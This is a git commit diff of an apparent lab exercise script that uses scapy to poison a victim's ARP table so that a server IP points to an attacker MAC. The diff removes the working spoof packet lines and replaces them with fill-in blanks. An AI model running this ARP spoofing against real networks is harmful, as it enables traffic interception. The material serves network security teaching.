3f2175671336c00554ff77462433cb4822dd4f45
KarolyJ <jonaskaroly15@gmail.com>
2026-04-27 15:29:11 +0200

    further tuning

--- arp_exercise2.py
+++ arp_exercise2.py
@@ -1,18 +1,18 @@
 from scapy.all import *
 import time
 
-ATTACKER_MAC = "02:42:c0:a8:65:14"
 VICTIM_MAC = "02:42:c0:a8:65:0a"
 SERVER_IP = "192.168.101.30"
+ATTACKER_MAC = "02:42:c0:a8:65:14"
 
 # Complete the script
-broadcast = Ether(dst=VICTIM_MAC)
 
 while True:
     print("Sending malicious ARP packets")
-
-    # Craft a malicious ARP packet to poison the victim ARP table to >
-    arp = ARP(op=2, hwdst=VICTIM_MAC, psrc=SERVER_IP)
+    # Craft a malicious ARP packet to poison the victim ARP table to point to m>
+    # broadcast = Ether(dst=...)
+    # arp = ARP(...........................................)
     sendp(broadcast / arp, verbose= False)
+
     time.sleep(1)
 
